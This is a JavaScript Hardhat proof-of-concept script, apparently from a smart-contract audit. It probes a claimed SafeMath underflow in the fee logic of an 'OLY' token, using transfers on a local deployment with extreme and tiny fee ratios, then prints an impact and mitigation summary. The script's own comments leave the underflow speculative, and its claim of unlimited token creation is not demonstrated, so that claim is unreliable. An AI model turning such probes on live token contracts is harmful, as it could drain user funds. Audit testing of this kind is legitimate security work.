/**
 * CVE-OLY-001: SafeMath Bypass Underflow Exploit
 * 
 * CRITICAL VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how the inconsistent SafeMath usage in fee deduction
 * can lead to integer underflow, resulting in massive token creation.
 * 
 * ⚠️ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("🔴 CVE-OLY-001: SafeMath Bypass Underflow Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, mainPair, feeReceiver] = await ethers.getSigners();
    
    console.log("👤 Deployer:", deployer.address);
    console.log("🏴‍☠️ Attacker:", attacker.address);
    console.log("🏪 Main Pair:", mainPair.address);
    console.log("💰 Fee Receiver:", feeReceiver.address);
    console.log("");

    // Step 1: Deploy mock fee receiver
    console.log("📋 Step 1: Deploying Mock Fee Receiver...");
    
    const MockFeeReceiver = await ethers.getContractFactory("MockFeeReceiver");
    const mockReceiver = await MockFeeReceiver.deploy();
    await mockReceiver.waitForDeployment();
    
    console.log("📡 Mock Fee Receiver deployed at:", await mockReceiver.getAddress());

    // Step 2: Deploy OLY contract with high fee ratio
    console.log("\n📋 Step 2: Deploying OLY Contract with High Fee Ratio...");
    
    const OLY = await ethers.getContractFactory("OLY");
    // Deploy with very high buy fee (50%) to trigger underflow
    const oly = await OLY.deploy(await mockReceiver.getAddress(), 50000); // 50% buy fee
    await oly.waitForDeployment();
    
    console.log("🪙 OLY Contract deployed at:", await oly.getAddress());
    
    const buyFeeRatio = await oly.buyFeeRatio();
    console.log("💸 Buy Fee Ratio:", buyFeeRatio.toString(), "(50%)");

    // Step 3: Setup contract state
    console.log("\n📋 Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens to main pair for the attack
    const mintAmount = ethers.parseUnits("10000", 9);
    await oly.mint(mainPair.address, mintAmount);
    
    console.log("✅ Main pair set to:", mainPair.address);
    console.log("✅ Tokens minted to main pair:", ethers.formatUnits(mintAmount, 9));

    // Step 4: Record initial state
    console.log("\n📋 Step 4: Recording Initial State...");
    
    const initialTotalSupply = await oly.totalSupply();
    const initialAttackerBalance = await oly.balanceOf(attacker.address);
    const initialMainPairBalance = await oly.balanceOf(mainPair.address);
    const initialFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    
    console.log("📊 Initial Total Supply:", ethers.formatUnits(initialTotalSupply, 9));
    console.log("📊 Initial Attacker Balance:", ethers.formatUnits(initialAttackerBalance, 9));
    console.log("📊 Initial Main Pair Balance:", ethers.formatUnits(initialMainPairBalance, 9));
    console.log("📊 Initial Fee Receiver Balance:", ethers.formatUnits(initialFeeReceiverBalance, 9));

    // Step 5: Attempt underflow exploit
    console.log("\n📋 Step 5: Attempting Underflow Exploit...");
    
    // Try to transfer a small amount that will cause underflow in fee calculation
    // With 50% fee, any amount will cause: amount - (amount * 50000 / 100000) = amount - amount/2
    // But if we can manipulate this to cause underflow...
    
    const exploitAmount = ethers.parseUnits("1", 9); // Very small amount
    
    console.log("🎯 Exploit Amount:", ethers.formatUnits(exploitAmount, 9));
    console.log("💀 Expected Fee (50%):", ethers.formatUnits(exploitAmount / 2n, 9));
    console.log("🧮 Fee Calculation: amount * 50000 / 100000");
    
    try {
        console.log("🚀 Executing buy transaction (mainPair -> attacker)...");
        
        // This should trigger the vulnerable fee calculation
        const tx = await oly.connect(mainPair).transfer(attacker.address, exploitAmount);
        await tx.wait();
        
        console.log("✅ Transaction completed");
        
        // Check results
        const finalAttackerBalance = await oly.balanceOf(attacker.address);
        const finalMainPairBalance = await oly.balanceOf(mainPair.address);
        const finalFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
        const finalTotalSupply = await oly.totalSupply();
        
        console.log("\n📊 Final Balances:");
        console.log("📊 Final Attacker Balance:", ethers.formatUnits(finalAttackerBalance, 9));
        console.log("📊 Final Main Pair Balance:", ethers.formatUnits(finalMainPairBalance, 9));
        console.log("📊 Final Fee Receiver Balance:", ethers.formatUnits(finalFeeReceiverBalance, 9));
        console.log("📊 Final Total Supply:", ethers.formatUnits(finalTotalSupply, 9));
        
        // Calculate changes
        const attackerGain = finalAttackerBalance - initialAttackerBalance;
        const mainPairLoss = initialMainPairBalance - finalMainPairBalance;
        const feeReceiverGain = finalFeeReceiverBalance - initialFeeReceiverBalance;
        const supplyChange = finalTotalSupply - initialTotalSupply;
        
        console.log("\n📈 Balance Changes:");
        console.log("📈 Attacker Gain:", ethers.formatUnits(attackerGain, 9));
        console.log("📈 Main Pair Loss:", ethers.formatUnits(mainPairLoss, 9));
        console.log("📈 Fee Receiver Gain:", ethers.formatUnits(feeReceiverGain, 9));
        console.log("📈 Total Supply Change:", ethers.formatUnits(supplyChange, 9));
        
        // Check for underflow indicators
        if (attackerGain > exploitAmount) {
            console.log("🚨 POTENTIAL UNDERFLOW DETECTED!");
            console.log("💀 Attacker received more than transfer amount!");
        }
        
        if (supplyChange !== 0n) {
            console.log("🚨 TOTAL SUPPLY CHANGED - CRITICAL BUG!");
            console.log("💀 Tokens created or destroyed unexpectedly!");
        }
        
        // Verify arithmetic consistency
        const expectedBalance = exploitAmount - (exploitAmount * 50000n / 100000n);
        console.log("🧮 Expected Attacker Balance:", ethers.formatUnits(expectedBalance, 9));
        
        if (attackerGain !== expectedBalance) {
            console.log("🚨 ARITHMETIC INCONSISTENCY DETECTED!");
            console.log("💀 Fee calculation produced unexpected result!");
        }
        
    } catch (error) {
        console.log("❌ Transaction failed:", error.message);
        
        // Check if it's an underflow revert
        if (error.message.includes("underflow") || error.message.includes("subtraction")) {
            console.log("✅ SafeMath caught the underflow - vulnerability mitigated");
        } else {
            console.log("💀 Unexpected error - investigate further");
        }
    }

    // Step 6: Test with manipulated fee ratio
    console.log("\n📋 Step 6: Testing with Extreme Fee Ratio...");
    
    try {
        // Set fee ratio to maximum (100%)
        await oly.setRatio(0, 100000); // 100% buy fee
        console.log("💸 Set buy fee to 100%");
        
        const extremeAmount = ethers.parseUnits("100", 9);
        console.log("🎯 Testing with amount:", ethers.formatUnits(extremeAmount, 9));
        
        const beforeBalance = await oly.balanceOf(attacker.address);
        
        await oly.connect(mainPair).transfer(attacker.address, extremeAmount);
        
        const afterBalance = await oly.balanceOf(attacker.address);
        const received = afterBalance - beforeBalance;
        
        console.log("📊 Attacker received:", ethers.formatUnits(received, 9));
        
        if (received === 0n) {
            console.log("✅ 100% fee correctly applied - no tokens received");
        } else if (received > extremeAmount) {
            console.log("🚨 CRITICAL: Received more than sent - UNDERFLOW CONFIRMED!");
        }
        
    } catch (error) {
        console.log("❌ Extreme fee test failed:", error.message);
    }

    // Step 7: Demonstrate precision attack
    console.log("\n📋 Step 7: Testing Precision-Based Attack...");
    
    try {
        // Reset to normal fee
        await oly.setRatio(0, 1000); // 1% buy fee
        
        // Test with very small amounts that might cause precision issues
        const tinyAmount = 1n; // 1 wei
        console.log("🎯 Testing with tiny amount:", tinyAmount.toString(), "wei");
        
        const beforeTiny = await oly.balanceOf(attacker.address);
        
        await oly.connect(mainPair).transfer(attacker.address, tinyAmount);
        
        const afterTiny = await oly.balanceOf(attacker.address);
        const receivedTiny = afterTiny - beforeTiny;
        
        console.log("📊 Received from tiny transfer:", receivedTiny.toString(), "wei");
        
        // Calculate expected fee
        const expectedFee = tinyAmount * 1000n / 100000n; // Should be 0 due to rounding
        const expectedReceived = tinyAmount - expectedFee;
        
        console.log("🧮 Expected fee:", expectedFee.toString(), "wei");
        console.log("🧮 Expected received:", expectedReceived.toString(), "wei");
        
        if (receivedTiny !== expectedReceived) {
            console.log("🚨 PRECISION ISSUE DETECTED!");
        }
        
    } catch (error) {
        console.log("❌ Precision test failed:", error.message);
    }

    // Step 8: Impact Assessment
    console.log("\n📋 Step 8: Impact Assessment");
    console.log("=" .repeat(60));
    
    console.log("🔍 VULNERABILITY ANALYSIS:");
    console.log("   • Direct arithmetic operations bypass SafeMath");
    console.log("   • Potential for integer underflow in fee calculations");
    console.log("   • Inconsistent overflow protection across operations");
    console.log("   • Risk of balance corruption and token creation");
    console.log("");
    
    console.log("💰 POTENTIAL FINANCIAL IMPACT:");
    console.log("   • Unlimited token creation through underflow");
    console.log("   • Protocol insolvency from balance corruption");
    console.log("   • Loss of fee collection integrity");
    console.log("   • Total supply manipulation");
    console.log("");
    
    console.log("🛡️ MITIGATION REQUIRED:");
    console.log("   • Use SafeMath for ALL arithmetic operations");
    console.log("   • Replace direct subtraction: amount = amount.sub(fee)");
    console.log("   • Replace direct addition: balance = balance.add(amount)");
    console.log("   • Add comprehensive overflow/underflow testing");

    console.log("\n🔴 EXPLOIT ANALYSIS COMPLETED");
    console.log("⚠️ This demonstrates potential for CRITICAL arithmetic vulnerabilities");
}

// Mock Fee Receiver Contract Source
const mockFeeReceiverSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MockFeeReceiver {
    event SwapTriggered();
    
    function triggerSwapFeeForLottery() external {
        emit SwapTriggered();
    }
}
`;

// Export for use in other scripts
module.exports = {
    main,
    mockFeeReceiverSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("💥 Exploit failed:", error);
            process.exit(1);
        });
}